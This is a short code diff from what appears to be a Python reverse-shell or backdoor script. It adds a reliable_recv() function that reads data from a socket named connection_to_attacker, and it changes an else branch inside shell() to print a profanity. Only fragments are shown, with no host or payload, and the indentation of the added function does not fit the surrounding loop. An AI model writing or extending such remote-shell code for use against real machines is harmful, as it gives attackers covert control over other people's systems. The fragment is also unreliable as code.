@@ -1,3 +1,5 @@
+def reliable_recv():
+    data = ""
     while True:
         try:
             data = data + connection_to_attacker.recv(1024).decode().rstrip()
@@ -22,7 +24,8 @@ def shell():
             except:
                 pass
         else:
-            pass
+            print("FuckOff")
+                
 
 def connection():
     while True:
